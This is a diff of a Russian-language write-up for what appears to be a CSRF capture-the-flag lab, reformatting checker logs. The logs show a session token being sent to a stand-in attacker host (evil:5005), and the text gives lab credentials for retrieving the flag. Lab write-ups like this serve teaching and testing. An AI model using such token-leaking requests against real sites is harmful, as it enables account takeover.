@@ -20,18 +20,16 @@ CSRF (Cross-Site Request Forgery) — это атака, при которой �
 
 Пример логов чекера:
 
-*Copy
-
-Checker script started
-
-Checking...
-Starting check...
-Opening login page: http://web:5000/login
-Logged in as admin
-CSRF Token: 13acb3deb0f514fa73d75148cd9d34af
-Opening attacker page: http://evil:5005/login?csrf_token=13acb3deb0f514fa73d75148cd9d34af
-Page loaded successfully
-Re-opening login page: http://web:5000/login
-CSRF exploit worked! ✅*
+*Copy*
+*Checker script started*
+*Checking...*
+*Starting check...*
+*Opening login page: http://web:5000/login*
+*Logged in as admin*
+*CSRF Token: 13acb3deb0f514fa73d75148cd9d34af*
+*Opening attacker page: http://evil:5005/login?csrf_token=13acb3deb0f514fa73d75148cd9d34af*
+*Page loaded successfully*
+*Re-opening login page: http://web:5000/login*
+*CSRF exploit worked! ✅*
 
 После того, как последняя строка будет иметь место, можно зайти на страницу логина (**http://web:5000/login**), выполнить вход ("admin/hacked123") и увидеть флаг.
